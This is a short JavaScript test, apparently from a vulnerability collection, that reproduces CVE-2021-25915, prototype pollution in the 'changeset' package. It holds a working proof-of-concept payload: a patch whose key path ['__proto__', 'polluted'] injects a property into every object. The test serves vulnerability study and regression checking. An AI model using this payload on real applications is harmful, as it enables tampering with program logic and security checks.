//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25915
test("prototype pollution in changeset", () => {
  expect({}.polluted).toBe(undefined);

  const changeset = require("changeset");
  const patch = [{ type: "put", key: ["__proto__", "polluted"], value: "yes" }];
  changeset.apply(patch, {}, true);

  expect({}.polluted).toBe("yes");
});
